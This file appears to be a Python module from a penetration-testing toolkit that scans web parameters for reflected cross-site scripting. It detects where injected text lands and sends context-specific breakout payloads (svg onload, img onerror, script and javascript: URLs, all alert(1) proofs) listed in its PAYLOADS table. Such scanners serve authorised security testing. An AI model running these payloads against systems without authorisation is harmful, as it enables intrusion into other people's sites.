#!/usr/bin/env python3
"""
redshift_toolkit.web.xss_scanner — reflected XSS scanner with
context-aware payload selection.

Methodology
-----------
1. Send a benign canary token (e.g. "rsxss19237") in each parameter.
2. Search the response body for the canary.
3. For each reflection, classify the HTML/JS context by what surrounds the
   canary:
       - HTML body         (between tags)
       - HTML attribute    (inside attr=...)
       - JS string literal (inside <script>...)
       - URL context       (inside href/src)
       - Comment           (inside <!--...-->)
4. Send the matching breakout payload, look for it un-encoded in response.
5. Report contexts and successful payloads.

This module DOES NOT execute browsers. It does not detect DOM XSS — that
requires headless Chrome instrumentation, which is out of scope for an
import-free Python module. For DOM XSS use Burp Pro + DOM Invader.

Usage
-----
  python3 -m redshift_toolkit.web.xss_scanner \\
      --url 'https://app.example.com/search?q=test'
  python3 -m redshift_toolkit.web.xss_scanner \\
      --url https://app.example.com/search --data 'q=test' --params q

Author: Redshift Project — Module 14
License: MIT
"""

from __future__ import annotations

import argparse
import json
import re
import secrets
import sys
from dataclasses import dataclass, asdict, field
from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit

from redshift_toolkit.web.http_client import HttpRequest, send

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


# Context detectors — given the snippet of HTML around the canary,
# decide which context it landed in.
def detect_context(body_text: str, canary: str) -> list[str]:
    contexts = []
    for m in re.finditer(re.escape(canary), body_text):
        i = m.start()
        before = body_text[max(0, i - 200):i]
        after = body_text[i:i + 200]
        # Inside <script>?
        last_script_open = before.rfind("<script")
        last_script_close = before.rfind("</script>")
        if last_script_open > last_script_close:
            contexts.append("js")
            continue
        # Inside HTML comment?
        last_comment_open = before.rfind("<!--")
        last_comment_close = before.rfind("-->")
        if last_comment_open > last_comment_close:
            contexts.append("comment")
            continue
        # Inside an attribute?
        # Heuristic: look back for the most recent unmatched '='
        last_eq = max(before.rfind('="'), before.rfind("='"))
        last_gt = before.rfind(">")
        if last_eq > last_gt and last_eq != -1:
            # Check if we're in href/src
            tag_start = before.rfind("<", 0, last_eq)
            attr_window = before[tag_start:last_eq]
            if re.search(r"\b(?:href|src|action|formaction)\s*=$", attr_window):
                contexts.append("url")
            else:
                contexts.append("attribute")
            continue
        # Inside a tag (between < and >)? Rare but possible.
        if last_gt < before.rfind("<"):
            contexts.append("tag-name")
            continue
        contexts.append("html")
    return contexts


# Per-context breakout payloads.
PAYLOADS = {
    "html": [
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<script>alert(1)</script>",
    ],
    "attribute": [
        '"><svg onload=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        "\" autofocus onfocus=alert(1) x=\"",
    ],
    "js": [
        "';alert(1);//",
        '";alert(1);//',
        "</script><svg onload=alert(1)>",
    ],
    "url": [
        "javascript:alert(1)",
    ],
    "comment": [
        "--><svg onload=alert(1)>",
    ],
    "tag-name": [
        "><svg onload=alert(1)>",
    ],
}


@dataclass
class XssFinding:
    parameter: str
    contexts: list[str] = field(default_factory=list)
    successful_payloads: list[tuple[str, str]] = field(default_factory=list)  # (context, payload)
    notes: str = ""


def _replace_param_in_url(url: str, name: str, value: str) -> str:
    sp = urlsplit(url)
    qs = parse_qsl(sp.query, keep_blank_values=True)
    new = []
    seen = False
    for k, v in qs:
        if k == name and not seen:
            new.append((k, value))
            seen = True
        else:
            new.append((k, v))
    if not seen:
        new.append((name, value))
    return urlunsplit((sp.scheme, sp.netloc, sp.path, urlencode(new), sp.fragment))


def _replace_param_in_body(body: str, name: str, value: str) -> str:
    parts = parse_qsl(body, keep_blank_values=True)
    new = []
    seen = False
    for k, v in parts:
        if k == name and not seen:
            new.append((k, value))
            seen = True
        else:
            new.append((k, v))
    if not seen:
        new.append((name, value))
    return urlencode(new)


def test_param(url: str, param: str, *,
               body: str | None = None,
               method: str = "GET",
               headers: list[tuple[str, str]] | None = None,
               tls_verify: bool = True, timeout: float = 15.0) -> XssFinding | None:
    canary = "rsxss" + secrets.token_hex(4)
    if body is not None:
        new_body = _replace_param_in_body(body, param, canary)
        new_url = url
    else:
        new_url = _replace_param_in_url(url, param, canary)
        new_body = None

    h = list(headers or [])
    if new_body and not any(k.lower() == "content-type" for k, _ in h):
        h.append(("Content-Type", "application/x-www-form-urlencoded"))

    r = send(HttpRequest(method=method, url=new_url, headers=h, body=new_body),
             timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
    body_text = r.body.decode("latin-1", errors="replace")
    if canary not in body_text:
        return None

    contexts = detect_context(body_text, canary)
    contexts = list(dict.fromkeys(contexts))  # de-dupe, preserve order
    finding = XssFinding(parameter=param, contexts=contexts)

    # Try one payload per context that we observed
    for ctx in contexts:
        for payload in PAYLOADS.get(ctx, []):
            full_value = canary + payload
            if body is not None:
                pb = _replace_param_in_body(body, param, full_value)
                pu = url
            else:
                pu = _replace_param_in_url(url, param, full_value)
                pb = None
            try:
                rr = send(HttpRequest(method=method, url=pu, headers=h, body=pb),
                          timeout=timeout, tls_verify=tls_verify,
                          follow_redirects=False)
            except Exception:
                continue
            rb = rr.body.decode("latin-1", errors="replace")
            # Naive check: payload appears un-encoded.
            if payload in rb:
                finding.successful_payloads.append((ctx, payload))
                break  # one successful payload per context is enough

    if not finding.successful_payloads:
        finding.notes = "reflected but all payloads encoded — may need manual inspection"
    return finding


def render_text(findings: list[XssFinding], color: bool) -> str:
    out = [paint("\n=== XSS scan results ===", BOLD, color)]
    if not findings:
        out.append(paint("  no reflections detected in the parameters tested.",
                         GREEN, color))
        return "\n".join(out)
    for f in findings:
        if f.successful_payloads:
            tag = paint("[XSS]", RED, color)
        elif f.contexts:
            tag = paint("[REFL]", YELLOW, color)
        else:
            tag = paint("[----]", GREEN, color)
        out.append(f"  {tag} {paint(f.parameter, BOLD, color)} "
                   f"context(s): {', '.join(f.contexts) or 'none'}")
        for ctx, p in f.successful_payloads:
            out.append(f"      ✓ [{ctx}] {p}")
        if f.notes:
            out.append(f"      {paint(f.notes, YELLOW, color)}")
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="Reflected XSS scanner.")
    ap.add_argument("--url", required=True)
    ap.add_argument("--data", help="POST/PUT body, x-www-form-urlencoded")
    ap.add_argument("-X", "--method", default=None)
    ap.add_argument("--params", help="comma-separated parameter names "
                    "(default: all in URL/body)")
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color and not args.json

    method = args.method or ("POST" if args.data else "GET")
    headers = []
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers.append((k.strip(), v.strip()))

    if args.params:
        params = [p.strip() for p in args.params.split(",") if p.strip()]
    elif args.data:
        params = [k for k, _ in parse_qsl(args.data, keep_blank_values=True)]
    else:
        sp = urlsplit(args.url)
        params = [k for k, _ in parse_qsl(sp.query, keep_blank_values=True)]

    if not params:
        print("[!] no parameters to test", file=sys.stderr)
        return 2

    findings: list[XssFinding] = []
    for p in params:
        if not args.json:
            print(paint(f"[*] testing {p}", BOLD, color))
        f = test_param(args.url, p, body=args.data, method=method,
                       headers=headers, tls_verify=not args.insecure,
                       timeout=args.timeout)
        if f:
            findings.append(f)

    if args.json:
        out = []
        for f in findings:
            d = asdict(f)
            d["successful_payloads"] = [{"context": c, "payload": p}
                                         for c, p in f.successful_payloads]
            out.append(d)
        print(json.dumps(out, indent=2))
    else:
        print(render_text(findings, color))

    return 0 if not findings else 1


if __name__ == "__main__":
    sys.exit(main())
